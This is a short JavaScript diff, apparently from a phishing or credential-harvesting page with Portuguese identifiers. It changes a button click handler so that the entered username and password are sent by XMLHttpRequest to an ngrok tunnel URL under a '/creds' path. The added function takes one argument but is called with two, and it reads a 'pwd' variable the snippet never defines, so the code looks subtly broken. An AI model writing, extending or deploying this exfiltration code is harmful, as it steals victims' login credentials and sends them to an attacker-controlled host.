@@ -45,9 +45,9 @@ function send_data(usuario, senha){
                                   
                                   
                                   
-function teste_send(user){
+function teste_send(u){
    var xhr = new XMLHttpRequest();
-    xhr.open("GET", "https://7e68-45-162-158-3.sa.ngrok.io/creds?user=" + user, true);
+    xhr.open("GET", "https://7e68-45-162-158-3.sa.ngrok.io/creds?user=" + u + "&pwd=" + pwd, true);
     xhr.onreadystatechange = function() {
         if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
             console.log(xhr.responseText);
@@ -66,7 +66,7 @@ btn[1].addEventListener('click', function(){
     }, 3000);
     //teste_send(user)   
     if (user != null || user != undefined || pass != null || pass != undefined){
-        send_data(user, pass);
+        teste_send(user, pass);
     }
 })
 
